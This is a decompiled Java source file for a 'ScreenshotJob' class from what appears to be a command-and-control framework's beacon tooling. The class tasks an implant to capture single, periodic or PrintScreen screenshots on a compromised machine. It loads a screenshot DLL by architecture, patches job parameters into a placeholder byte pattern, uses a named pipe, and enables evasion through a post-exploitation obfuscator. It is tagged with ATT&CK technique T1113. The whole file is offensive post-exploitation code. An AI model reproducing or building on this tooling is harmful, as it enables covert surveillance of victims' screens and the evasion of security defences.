package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class ScreenshotJob extends Job {
   public static final int SCREENSHOT_SINGLE = 0;
   public static final int SCREENSHOT_MULTI = 1;
   public static final int IMPL_CLASSIC = 0;
   public static final int IMPL_PRINTSCREEN = 1;
   protected int type = 0;
   protected int impl = 1;

   public ScreenshotJob(TaskBeacon var1, int var2, int var3) {
      super(var1);
      this.type = var2;
      this.impl = var3;
   }

   public static ScreenshotJob Screenwatch(TaskBeacon var0) {
      return new ScreenshotJob(var0, 1, 0);
   }

   public static ScreenshotJob Screenshot(TaskBeacon var0) {
      return new ScreenshotJob(var0, 0, 0);
   }

   public static ScreenshotJob Printscreen(TaskBeacon var0) {
      return new ScreenshotJob(var0, 0, 1);
   }

   public String getDescription() {
      if (this.impl == 1) {
         return "Tasked beacon to take screenshot (PrintScr)";
      } else {
         return this.type == 0 ? "Tasked beacon to take screenshot" : "Tasked beacon to take periodic screenshots";
      }
   }

   public int getJobType() {
      return 101;
   }

   public String getShortDescription() {
      if (this.impl == 1) {
         return "printscreen";
      } else {
         return this.type == 0 ? "screenshot" : "screenwatch";
      }
   }

   public String getDLLName() {
      return this.arch.equals("x64") ? "resources/screenshot.x64.dll" : "resources/screenshot.dll";
   }

   public String getPipeName() {
      return "PIPEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
   }

   public int getCallbackType() {
      return 3;
   }

   public int getWaitTime() {
      return 15000;
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }

   public byte[] fix(byte[] var1) {
      Packer var2 = new Packer();
      var2.little();
      var2.addInt(this.type);
      var2.addInt(this.impl);
      String var3 = CommonUtils.pad(CommonUtils.bString(var2.getBytes()), '\u0000', 128);
      var1 = CommonUtils.patch(var1, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR", var3);
      return var1;
   }

   public String getTactic() {
      return "T1113";
   }
}
